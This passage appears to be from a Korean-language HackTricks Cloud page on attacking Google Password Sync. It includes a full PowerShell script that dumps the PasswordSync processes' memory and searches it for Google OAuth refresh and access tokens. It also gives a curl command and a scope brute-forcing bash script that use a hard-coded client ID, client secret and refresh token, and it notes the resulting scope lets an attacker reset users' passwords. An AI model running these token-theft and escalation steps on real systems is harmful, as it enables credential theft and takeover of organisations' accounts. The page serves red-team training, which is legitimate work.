이 API 호출의 입력 또는 출력에서 **복호화된** 값을 볼 수도 있습니다(Winpeas가 작동을 멈춘 경우).

비밀번호 동기화가 **SA 자격 증명으로 구성된 경우**, 레지스트리 **`HKLM\Software\Google\Google Apps Password Sync`** 내의 키에 저장됩니다.

### GPS - 메모리에서 토큰 덤프

GCPW와 마찬가지로 `PasswordSync.exe` 및 `password_sync_service.exe` 프로세스의 메모리를 덤프할 수 있으며, 리프레시 및 액세스 토큰을 찾을 수 있습니다(이미 생성된 경우).\
AD 구성된 자격 증명도 찾을 수 있을 것입니다.

<details>

<summary>덤프 <code>PasswordSync.exe</code> 및 <code>password_sync_service.exe</code> 프로세스 및 토큰 검색</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - 리프레시 토큰으로 액세스 토큰 생성

리프레시 토큰을 사용하여 다음 명령에 지정된 클라이언트 ID와 클라이언트 비밀을 사용하여 액세스 토큰을 생성할 수 있습니다:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Scopes

{% hint style="info" %}
리프레시 토큰이 있더라도, 액세스 토큰을 생성하는 애플리케이션에서 지원하는 **스코프만 요청할 수 있기 때문에** 액세스 토큰에 대한 스코프를 요청하는 것은 불가능합니다.

또한, 리프레시 토큰은 모든 애플리케이션에서 유효하지 않습니다.
{% endhint %}

기본적으로 GPS는 사용자가 모든 가능한 OAuth 스코프에 접근할 수 없으므로, 다음 스크립트를 사용하여 `refresh_token`으로 `access_token`을 생성하는 데 사용할 수 있는 스코프를 찾을 수 있습니다:

<details>

<summary>Bash script to brute-force scopes</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

그리고 이것은 제가 작성 당시 받은 출력입니다:
```
https://www.googleapis.com/auth/admin.directory.user
```
어떤 범위를 지정하지 않으면 얻는 것과 동일합니다.

{% hint style="danger" %}
이 범위로 **기존 사용자의 비밀번호를 수정하여 권한을 상승시킬 수 있습니다**.
{% endhint %}

## References

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* **💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 팁을 공유하세요.**

</details>
{% endhint %}
